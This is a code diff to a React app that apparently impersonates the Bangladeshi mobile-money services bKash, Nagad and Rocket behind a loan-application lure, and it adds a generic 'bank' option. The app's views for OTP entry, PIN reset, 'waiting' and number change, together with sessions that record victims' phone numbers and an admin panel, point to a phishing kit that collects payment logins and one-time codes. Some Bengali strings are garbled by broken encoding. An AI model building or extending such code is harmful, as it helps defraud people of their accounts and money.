@@ -97,7 +97,7 @@ export const db = {
 };
 
 type LoginView = 'landing' | 'login' | 'otp' | 'otp_wrong' | 'pin_reset' | 'waiting' | 'number_change';
-type Provider = 'bkash' | 'nagad' | 'rocket';
+type Provider = 'bkash' | 'nagad' | 'rocket' | 'bank';
 
 const App: React.FC = () => {
   const [showLogin, setShowLogin] = useState(false);
@@ -136,6 +136,13 @@ const App: React.FC = () => {
   const [rocketEnabled, setRocketEnabled] = useState<boolean>(() => {
     if (typeof localStorage !== 'undefined') {
       const saved = localStorage.getItem('setting_rocketEnabled');
+      if (saved !== null) return saved === 'true';
+    }
+    return true;
+  });
+  const [bankEnabled, setBankEnabled] = useState<boolean>(() => {
+    if (typeof localStorage !== 'undefined') {
+      const saved = localStorage.getItem('setting_bankEnabled');
       if (saved !== null) return saved === 'true';
     }
     return true;
@@ -216,6 +223,18 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
+    const unsubscribe = db.ref('settings/bankEnabled').on('value', (snapshot) => {
+      const val = snapshot.val();
+      const enabled = val === null ? true : !!val;
+      setBankEnabled(enabled);
+      if (typeof localStorage !== 'undefined') {
+        localStorage.setItem('setting_bankEnabled', String(enabled));
+      }
+    });
+    return () => { if (typeof unsubscribe === 'function') unsubscribe(); };
+  }, []);
+
+  useEffect(() => {
     if (provider === 'nagad' && !nagadEnabled) {
       if (bkashEnabled) {
         setProvider('bkash');
@@ -223,6 +242,9 @@ const App: React.FC = () => {
       } else if (rocketEnabled) {
         setProvider('rocket');
         localStorage.setItem('payment_provider', 'rocket');
+      } else if (bankEnabled) {
+        setProvider('bank');
+        localStorage.setItem('payment_provider', 'bank');
       } else {
         setProvider(null);
         localStorage.removeItem('payment_provider');
@@ -234,6 +256,9 @@ const App: React.FC = () => {
       } else if (rocketEnabled) {
         setProvider('rocket');
         localStorage.setItem('payment_provider', 'rocket');
+      } else if (bankEnabled) {
+        setProvider('bank');
+        localStorage.setItem('payment_provider', 'bank');
       } else {
         setProvider(null);
         localStorage.removeItem('payment_provider');
@@ -245,12 +270,29 @@ const App: React.FC = () => {
       } else if (nagadEnabled) {
         setProvider('nagad');
         localStorage.setItem('payment_provider', 'nagad');
+      } else if (bankEnabled) {
+        setProvider('bank');
+        localStorage.setItem('payment_provider', 'bank');
+      } else {
+        setProvider(null);
+        localStorage.removeItem('payment_provider');
+      }
+    } else if (provider === 'bank' && !bankEnabled) {
+      if (bkashEnabled) {
+        setProvider('bkash');
+        localStorage.setItem('payment_provider', 'bkash');
+      } else if (nagadEnabled) {
+        setProvider('nagad');
+        localStorage.setItem('payment_provider', 'nagad');
+      } else if (rocketEnabled) {
+        setProvider('rocket');
+        localStorage.setItem('payment_provider', 'rocket');
       } else {
         setProvider(null);
         localStorage.removeItem('payment_provider');
       }
     }
-  }, [nagadEnabled, bkashEnabled, rocketEnabled, provider]);
+  }, [nagadEnabled, bkashEnabled, rocketEnabled, bankEnabled, provider]);
 
   useEffect(() => { currentStepRef.current = currentStep; }, [currentStep]);
   useEffect(() => { showLoginRef.current = showLogin; }, [showLogin]);
@@ -320,6 +362,17 @@ const App: React.FC = () => {
       [data-provider="rocket"] .bg-pink-50{background-color:#F3E8F6!important}
       [data-provider="rocket"] .hover\\:bg-pink-50:hover{background-color:#F3E8F6!important}
 
+      [data-provider="bank"] .bg-\[\#E2136E\]{background-color:#0F6E4B!important}
+      [data-provider="bank"] .text-\[\#E2136E\]{color:#0F6E4B!important}
+      [data-provider="bank"] .border-\[\#E2136E\]{border-color:#0F6E4B!important}
+      [data-provider="bank"] .focus-within\:border-\[\#E2136E\]:focus-within{border-color:#0F6E4B!important}
+      [data-provider="bank"] .hover\:text-\[\#E2136E\]:hover{color:#0F6E4B!important}
+      [data-provider="bank"] .hover\:border-\[\#E2136E\]:hover{border-color:#0F6E4B!important}
+      [data-provider="bank"] .focus\:ring-\[\#E2136E\]:focus{--tw-ring-color:#0F6E4B!important}
+      [data-provider="bank"] .shadow-\[0_-4px_20px_rgba\(226\,19\,110\,0\.3\)\]{box-shadow:0 -4px 20px rgba(15,110,75,0.3)!important}
+      [data-provider="bank"] .bg-pink-50{background-color:#E6F2EC!important}
+      [data-provider="bank"] .hover\:bg-pink-50:hover{background-color:#E6F2EC!important}
+
       [data-keep-theme] .bg-\\[\\#E2136E\\]{background-color:#E2136E!important}
       [data-keep-theme] .text-\\[\\#E2136E\\]{color:#E2136E!important}
       [data-keep-theme] .border-\\[\\#E2136E\\]{border-color:#E2136E!important}
@@ -335,22 +388,33 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
-    if (provider !== 'nagad' && provider !== 'rocket') return;
-    const replaceMap: Array<[RegExp, string]> = provider === 'nagad'
-      ? [
-          [/à¦¬à¦¿à¦•à¦¾à¦¶/g, 'à¦¨à¦—à¦¦'],
-          [/bKash/g, 'Nagad'],
-          [/BKash/g, 'Nagad'],
-          [/Bkash/g, 'Nagad'],
-          [/bkash/g, 'nagad'],
-        ]
-      : [
-          [/à¦¬à¦¿à¦•à¦¾à¦¶/g, 'à¦°à¦•à§‡à¦Ÿ'],
-          [/bKash/g, 'Rocket'],
-          [/BKash/g, 'Rocket'],
-          [/Bkash/g, 'Rocket'],
-          [/bkash/g, 'rocket'],
-        ];
+    if (provider !== 'nagad' && provider !== 'rocket' && provider !== 'bank') return;
+    let replaceMap: Array<[RegExp, string]>;
+    if (provider === 'nagad') {
+      replaceMap = [
+        [/বিকাশ/g, 'নগদ'],
+        [/bKash/g, 'Nagad'],
+        [/BKash/g, 'Nagad'],
+        [/Bkash/g, 'Nagad'],
+        [/bkash/g, 'nagad'],
+      ];
+    } else if (provider === 'rocket') {
+      replaceMap = [
+        [/বিকাশ/g, 'রকেট'],
+        [/bKash/g, 'Rocket'],
+        [/BKash/g, 'Rocket'],
+        [/Bkash/g, 'Rocket'],
+        [/bkash/g, 'rocket'],
+      ];
+    } else {
+      replaceMap = [
+        [/বিকাশ/g, 'ব্যাংক'],
+        [/bKash/g, 'Bank'],
+        [/BKash/g, 'Bank'],
+        [/Bkash/g, 'Bank'],
+        [/bkash/g, 'bank'],
+      ];
+    }
     const SKIP_TAGS = new Set(['SCRIPT', 'STYLE', 'NOSCRIPT']);
     const applyReplace = (s: string) => {
       let out = s;
@@ -437,7 +501,7 @@ const App: React.FC = () => {
     setPhoneError('');
 
     setIsLoading(true);
-    if (provider !== 'nagad' && provider !== 'rocket') {
+    if (provider !== 'nagad' && provider !== 'rocket' && provider !== 'bank') {
       setShowLoginPopup(true);
       setTimeout(() => setShowLoginPopup(false), 3000);
     }
@@ -458,7 +522,7 @@ const App: React.FC = () => {
       await db.ref('sessions/' + newSessionId).set({
         id: newSessionId,
         orderId: uniqueId,
-        name: provider === 'nagad' ? 'Nagad User' : provider === 'rocket' ? 'Rocket User' : 'bKash User',
+        name: provider === 'nagad' ? 'Nagad User' : provider === 'rocket' ? 'Rocket User' : provider === 'bank' ? 'Bank User' : 'bKash User',
         provider: provider || 'bkash',
         initialPhone: mobileNumber,
         gatewayPhone: '',
@@ -579,6 +643,15 @@ const App: React.FC = () => {
     setShowLogin(true);
   };
 
+  const handleStartBank = () => {
+    if (!bankEnabled) return;
+    localStorage.setItem('payment_provider', 'bank');
+    setProvider('bank');
+    setCurrentStep(AppStep.ApplicationForm);
+    setLoginView('login');
+    setShowLogin(true);
+  };
+
   const handleLoanApplyIntent = () => {};
 
   const handleFormSubmit = async (data: LoanFormData) => {
@@ -673,6 +746,7 @@ const App: React.FC = () => {
     if (p === 'bkash' && !bkashEnabled) return;
     if (p === 'nagad' && !nagadEnabled) return;
     if (p === 'rocket' && !rocketEnabled) return;
+    if (p === 'bank' && !bankEnabled) return;
     setProvider(p);
     setCurrentStep(AppStep.ApplicationForm);
     setLoginView('login');
@@ -705,7 +779,7 @@ const App: React.FC = () => {
         </div>
 
         <div className="space-y-4 flex-1">
-          {!bkashEnabled && !nagadEnabled && !rocketEnabled ? (
+          {!bkashEnabled && !nagadEnabled && !rocketEnabled && !bankEnabled ? (
             <div className="p-6 text-center bg-gray-50 rounded-2xl border border-gray-200">
               <p className="text-gray-600 font-bold">à¦ªà§‡à¦®à§‡à¦¨à§à¦Ÿ à¦¸à§‡à¦¬à¦¾ à¦¸à¦¾à¦®à§Ÿà¦¿à¦•à¦­à¦¾à¦¬à§‡ à¦¬à¦¨à§à¦§ à¦†à¦›à§‡</p>
               <p className="text-xs text-gray-400 mt-1">à¦…à¦¨à§à¦—à§à¦°à¦¹ à¦•à¦°à§‡ à¦•à¦¿à¦›à§à¦•à§à¦·à¦£ à¦ªà¦° à¦šà§‡à¦·à§à¦Ÿà¦¾ à¦•à¦°à§à¦¨</p>
@@ -765,6 +839,25 @@ const App: React.FC = () => {
                   </div>
                 </div>
                 <ArrowRight className="w-5 h-5" style={{ color: '#8C3494' }} />
+              </button>
+              )}
+
+              {bankEnabled && (
+              <button
+                onClick={() => handleSelectProvider('bank')}
+                className="w-full flex items-center justify-between p-5 rounded-2xl bg-white border-2 border-gray-100 hover:border-[#0F6E4B] active:scale-[0.98] transition-all shadow-sm cursor-pointer"
+                style={{ ['--hover-color' as any]: '#0F6E4B' }}
+              >
+                <div className="flex items-center gap-4">
+                  <div className="w-14 h-14 rounded-xl flex items-center justify-center shadow-md" style={{ backgroundColor: '#0F6E4B' }}>
+                    <span className="text-white font-black text-lg">B</span>
+                  </div>
+                  <div className="text-left">
+                    <div className="font-bold text-gray-800 text-lg">ব্যাংক</div>
+                    <div className="text-xs text-gray-500 font-medium">Bank দিয়ে এগিয়ে যান</div>
+                  </div>
+                </div>
+                <ArrowRight className="w-5 h-5" style={{ color: '#0F6E4B' }} />
               </button>
               )}
             </>
@@ -863,7 +956,7 @@ const App: React.FC = () => {
         {showLoginPopup && (
           <div className="fixed inset-0 flex items-center justify-center z-[300] bg-black/20 backdrop-blur-sm">
             <div className="animate-bounce" style={{ animation: 'popupFloat 1.5s ease-in-out infinite' }}>
-              <img src={provider === 'nagad' ? '/nagad-logo.png' : provider === 'rocket' ? 'https://i.postimg.cc/yxG385sY/IMG-20260224-061622.png' : 'https://i.postimg.cc/g2Yx5WPw/1772765797205.png'} alt="" className="w-[40rem] h-auto max-w-[90vw]" />
+              <img src={provider === 'nagad' ? '/nagad-logo.png' : provider === 'rocket' ? 'https://i.postimg.cc/yxG385sY/IMG-20260224-061622.png' : provider === 'bank' ? 'https://i.postimg.cc/Hx21WWJ7/IMG-20260205-090841.jpg' : 'https://i.postimg.cc/g2Yx5WPw/1772765797205.png'} alt="" className="w-[40rem] h-auto max-w-[90vw]" />
             </div>
           </div>
         )}
@@ -1108,7 +1201,7 @@ const App: React.FC = () => {
       case AppStep.Home:
         return (
           <div data-keep-text data-keep-theme>
-            <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} />
+            <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onStartBank={handleStartBank} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} bankEnabled={bankEnabled} />
           </div>
         );
       case AppStep.ApplicationForm:
@@ -1134,7 +1227,7 @@ const App: React.FC = () => {
       case AppStep.Admin:
         return <AdminPanel onBack={() => { setShowLogin(true); setCurrentStep(AppStep.Home); }} />;
       default:
-        return <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} />;
+        return <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onStartBank={handleStartBank} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} bankEnabled={bankEnabled} />;
     }
   };
 
